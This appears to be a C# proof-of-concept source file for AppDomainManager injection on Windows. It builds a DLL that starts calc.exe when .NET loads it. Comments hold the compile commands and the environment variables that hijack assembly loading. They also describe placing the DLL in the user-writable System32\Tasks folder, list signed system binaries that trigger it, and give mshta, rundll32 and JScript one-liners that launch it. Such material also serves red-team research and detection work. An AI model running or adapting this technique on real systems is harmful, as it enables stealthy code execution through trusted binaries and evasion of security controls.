using System;
using System.EnterpriseServices;
using System.Runtime.InteropServices;

using System.IO;
using System.Reflection;
using System.Runtime.Hosting;

using System.Dynamic;



/*
Appdomain Manager, looks for embedded Manifest on Load
*/

[ComVisible(true)]
[Guid("31D2B969-7608-426E-9D8E-A09FC9A5ABCD")]
[ClassInterface(ClassInterfaceType.None)]

public sealed class MyAppDomainManager : AppDomainManager
{
  
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
		//Console.WriteLine("AppDomain - KaBoom!");
		//System.Windows.Forms.MessageBox.Show("Kaboom!");
		
		System.Diagnostics.Process.Start("calc.exe");
        return;
    }
}

/*
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:tasks.dll tasks.cs
set APPDOMAIN_MANAGER_ASM=tasks, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
set APPDOMAIN_MANAGER_TYPE=MyAppDomainManager
set COMPLUS_Version=v4.0.30319

del C:\Windows\System32\Tasks\tasks.dll
del C:\Windows\SysWow64\Tasks\tasks.dll


copy /Y tasks.dll C:\Windows\System32\Tasks\tasks.dll
copy /Y tasks.dll C:\Windows\SysWow64\Tasks\tasks.dll



PowerShell Example:
$env:APPDOMAIN_MANAGER_ASM="tasks, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null"
$env:APPDOMAIN_MANAGER_TYPE=MyAppDomainManager
$env:COMPLUS_Version=v4.0.30319


Trigger .NET Applications

[Sample PowerShell Arsenal query ]

gci C:\Windows\System32\*.exe | Get-PE | Where-Object {  $_.Imports.ModuleName -Contains "mscoree.dll" }

FileHistory.exe /?

Microsoft.Uev.SyncController.exe

PresentationHost.exe

stordiag.exe

TsWpfWrp.exe

UevAgentPolicyGenerator.exe

UevAppMonitor.exe

UevTemplateBaselineGenerator.exe

UevTemplateConfigItemGenerator.exe


Trigger via One-Liner
mshta.exe javascript:a=new%20ActiveXObject("System.Object");close();
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";a=new%20ActiveXObject("System.Object");close();

Trigger Via JScript

// var manifest string should be UTF-16
// Controls the search path for unmanged dlls
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
new ActiveXObject('WScript.Shell').Environment('Process')('APPDOMAIN_MANAGER_ASM') = 'Tasks, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null';
new ActiveXObject('WScript.Shell').Environment('Process')('APPDOMAIN_MANAGER_TYPE') = 'MyAppDomainManager';


var o = new ActiveXObject("System.Object"); // Trigger AppDomainManager Load

// Ideally, we create a DLL, drop it anywhere and load it like DynamicWrapper...

// Loads Assembly, but expects it in the C:\Windows\System32 for example for managed code...
// Good news, CLR tries to resolve in sub dir with name of app.  
// Since C:\Windows\system32\tasks is user writable... :) CLR finds and loads our assembly.

new ActiveXObject('WScript.Shell').Environment('Process')('TMP') = 'C:\\Tools';
var manifest = '<?xml version="1.0" encoding="UTF-16" standalone="yes"?><assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1" xmlns:asmv3="urn:schemas-microsoft-com:asm.v3"><assemblyIdentity name="tasks" type="win32" version="0.0.0.0" /><description>Built with love by Casey Smith @subTee </description><clrClass   name="MyDLL.Operations"   clsid="{31D2B969-7608-426E-9D8E-A09FC9A5ACDC}"   progid="MyDLL.Operations"   runtimeVersion="v4.0.30319"   threadingModel="Both" /><file name="tasks.dll"> </file></assembly>';

var ax = new ActiveXObject("Microsoft.Windows.ActCtx");

ax.ManifestText = manifest;

var dwx = ax.CreateObject("MyDLL.Operations");
WScript.StdOut.WriteLine(dwx.getValue1("a"));
WScript.StdOut.WriteLine(dwx.getValue2());




*/




namespace MyDLL
{
	 
	 [ComVisible(true)]
	 [Guid("31D2B969-7608-426E-9D8E-A09FC9A5ACDC")]
	 [ClassInterface(ClassInterfaceType.None)]
	 [ProgId("MyDLL.Operations")]
	 public class Operations //: DynamicObject
	 {
		 
		 public Operations()
		 {
			 Console.WriteLine("So It Begins");
		 }
		 
		 [ComVisible(true)]
		 public string getValue1(string sParameter)
		 {
			 switch (sParameter)
			 {
				 case "a":
				 return "A was chosen";

				 case "b":
				 return "B was chosen";

				 case "c":
				 return "C was chosen";

				 default:
				 return "Other";
			}
		}
		 
		 [ComVisible(true)]
		 public string getValue2()
		 {
			return "From VBS String Function";
		 }
		 
		 
		 
	 }
}